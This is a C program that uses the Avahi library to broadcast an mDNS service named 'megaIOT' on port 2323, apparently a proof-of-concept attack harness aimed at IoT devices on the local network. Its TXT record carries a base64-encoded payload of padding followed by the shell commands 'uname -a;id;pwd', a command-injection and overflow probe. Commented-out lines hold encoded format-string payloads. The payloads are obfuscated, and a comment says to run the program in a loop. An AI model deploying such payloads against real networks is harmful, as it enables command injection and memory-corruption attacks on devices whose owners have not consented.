#ifdef HAVE_CONFIG_H
#include <config.h>
#endif
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <avahi-client/client.h>
#include <avahi-client/publish.h>
#include <avahi-common/alternative.h>
#include <avahi-common/simple-watch.h>
#include <avahi-common/malloc.h>
#include <avahi-common/error.h>
#include <avahi-common/timeval.h>

#define SERVICE_NAME "megaIOT"
#define EXIT_TIMEOUT_MS 10000 // exit after 10s
// run this in loop: while true; do ./publish ; done

static AvahiEntryGroup *group = NULL;
static AvahiSimplePoll *simple_poll = NULL;

static char *name = NULL;
static int g_index = 0;

static void create_services(AvahiClient *c);

static void entry_group_callback(AvahiEntryGroup *g, AvahiEntryGroupState state, AVAHI_GCC_UNUSED void *userdata) {
    assert(g == group || group == NULL);
    group = g;
    /* Called whenever the entry group state changes */
    switch (state) {
        case AVAHI_ENTRY_GROUP_ESTABLISHED :
            /* The entry group has been established successfully */
            fprintf(stderr, "[+] Service '%s' successfully established.\n", name);
            break;
        case AVAHI_ENTRY_GROUP_COLLISION : {
            char *n;
            /* A service name collision with a remote service
             * happened. Let's pick a new name */
            n = avahi_alternative_service_name(name);
            avahi_free(name);
            name = n;
            fprintf(stderr, "[-] Service name collision, renaming service to '%s'\n", name);
            /* And recreate the services */
            create_services(avahi_entry_group_get_client(g));
            break;
        }
        case AVAHI_ENTRY_GROUP_FAILURE :
            fprintf(stderr, "[-] Entry group failure: %s\n", avahi_strerror(avahi_client_errno(avahi_entry_group_get_client(g))));
            /* Some kind of failure happened while we were registering our services */
            avahi_simple_poll_quit(simple_poll);
            break;
        case AVAHI_ENTRY_GROUP_UNCOMMITED:
        case AVAHI_ENTRY_GROUP_REGISTERING:
            ;
    }
}

static void create_services(AvahiClient *c) {
    char *n;
    int ret;

    assert(c);
    /* If this is the first time we're called, let's create a new
     * entry group if necessary */
    if (!group)
        if (!(group = avahi_entry_group_new(c, entry_group_callback, NULL))) {
            fprintf(stderr, "avahi_entry_group_new() failed: %s\n", avahi_strerror(avahi_client_errno(c)));
            goto fail;
        }
    /* If the group is empty (either because it was just created, or
     * because it was reset previously, add our entries.  */
 
    //TXT record
    if (avahi_entry_group_is_empty(group)) {
        fprintf(stderr, "[+] Adding service '%s'\n", name);
	// broadcast foo for this ip on port 2323
	uint16_t port = 2323;

	//Each service has an associated DNS TXT record. The application can use it to publish a small amount of metadata. The record contains key-value pairs. The keys must be all printable ascii characters excluding ‘=’. The value may contain any data.

	//snprintf(txtz[0], sizeof(txtz[0]), "MAC=11:22:33:44:55:66");
	AvahiStringList *txt = NULL;

	//txt = avahi_string_list_add(txt, "VEVTVElORwo=");
	txt = avahi_string_list_add(txt, "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXVuYW1lIC1hO2lkO3B3ZAo=");
	//txt = avahi_string_list_add(txt, "Rk1UU1RVRkY6JXguJXgK");
	//txt = avahi_string_list_add(txt, "QUFBQTolMTYkc3M=");
	//txt = avahi_string_list_add(txt, "hello=2");

	fprintf(stdout, "len=%d\n", avahi_string_list_length(txt));

	char *domain = NULL;
	char *host = NULL;

        // Add the service for IPP
        if ((ret = avahi_entry_group_add_service_strlst(group, AVAHI_IF_UNSPEC, AVAHI_PROTO_UNSPEC, 0, 
							name, "_foo._tcp", domain, host, port, txt)) < 0) {
/*
        if ((ret = avahi_entry_group_add_service(group, AVAHI_IF_UNSPEC, AVAHI_PROTO_UNSPEC, 0, 
							name, "_foo._tcp", NULL, NULL, port, txt1, txt0, txtzz, NULL)) < 0) {
*/
            if (ret == AVAHI_ERR_COLLISION)
                goto collision;
            fprintf(stderr, "[-] Failed to add _foo._tcp service: %s\n", avahi_strerror(ret));
            goto fail;
        }

        /* Tell the server to register the service */
        if ((ret = avahi_entry_group_commit(group)) < 0) {
            fprintf(stderr, "Failed to commit entry group: %s\n", avahi_strerror(ret));
            goto fail;
        }
    }
    return;
collision:
    /* A service name collision with a local service happened. Let's
     * pick a new name */
    n = avahi_alternative_service_name(name);
    avahi_free(name);
    name = n;
    fprintf(stderr, "Service name collision, renaming service to '%s'\n", name);
    avahi_entry_group_reset(group);
    create_services(c);
    return;
fail:
    avahi_simple_poll_quit(simple_poll);
}
static void client_callback(AvahiClient *c, AvahiClientState state, AVAHI_GCC_UNUSED void * userdata) {
    assert(c);
    /* Called whenever the client or server state changes */
    switch (state) {
        case AVAHI_CLIENT_S_RUNNING:
            /* The server has startup successfully and registered its host
             * name on the network, so it's time to create our services */
            create_services(c);
            break;
        case AVAHI_CLIENT_FAILURE:
            fprintf(stderr, "Client failure: %s\n", avahi_strerror(avahi_client_errno(c)));
            avahi_simple_poll_quit(simple_poll);
            break;
        case AVAHI_CLIENT_S_COLLISION:
            /* Let's drop our registered services. When the server is back
             * in AVAHI_SERVER_RUNNING state we will register them
             * again with the new host name. */
        case AVAHI_CLIENT_S_REGISTERING:
            /* The server records are now being established. This
             * might be caused by a host name change. We need to wait
             * for our own records to register until the host name is
             * properly esatblished. */
            if (group)
                avahi_entry_group_reset(group);
            break;
        case AVAHI_CLIENT_CONNECTING:
            ;
    }
}

static void modify_callback(AVAHI_GCC_UNUSED AvahiTimeout *e, void *userdata) {
    AvahiClient *client = userdata;
    avahi_free(name);

    char newname[128];

    snprintf(newname, sizeof(newname), "%s%d", SERVICE_NAME, g_index);

    g_index++;

    name = avahi_strdup(newname);

    fprintf(stderr, "modding registered name: %s\n", name);
    /* If the server is currently running, we need to remove our
     * service and create it anew */
    if (avahi_client_get_state(client) == AVAHI_CLIENT_S_RUNNING) {
        /* Remove the old services */
        if (group)
            avahi_entry_group_reset(group);
        /* And create them again with the new name */
        create_services(client);
    }
}

static void exit_callback(AVAHI_GCC_UNUSED AvahiTimeout *e, void *userdata) {
	fprintf(stderr, "[+] exit\n");
	exit(0);
}

int main(AVAHI_GCC_UNUSED int argc, AVAHI_GCC_UNUSED char*argv[]) {
    AvahiClient *client = NULL;
    int error;
    int ret = 1;
    struct timeval tv;
    /* Allocate main loop object */
    if (!(simple_poll = avahi_simple_poll_new())) {
        fprintf(stderr, "Failed to create simple poll object.\n");
        goto fail;
    }

    name = avahi_strdup(SERVICE_NAME);

    client = avahi_client_new(avahi_simple_poll_get(simple_poll), 0, client_callback, NULL, &error);
    if (!client) {
        fprintf(stderr, "Failed to create client: %s\n", avahi_strerror(error));
        goto fail;
    }


// make this in a loop and have an index for each

    // 10s send modded name

	// = 10s = 10*128
	/*for (int i = 0; i < 10; i++) {
	    avahi_simple_poll_get(simple_poll)->timeout_new(
		avahi_simple_poll_get(simple_poll),
		avahi_elapse_time(&tv, i*1000, 0),
		modify_callback,
		client);
	}*/

    avahi_simple_poll_get(simple_poll)->timeout_new(
        avahi_simple_poll_get(simple_poll),
        avahi_elapse_time(&tv, EXIT_TIMEOUT_MS, 0),
        exit_callback,
        client);

    // main loop
    avahi_simple_poll_loop(simple_poll);

    ret = 0;
fail:
    /* Cleanup things */
    if (client)
        avahi_client_free(client);
    if (simple_poll)
        avahi_simple_poll_free(simple_poll);
    avahi_free(name);
    return ret;
}
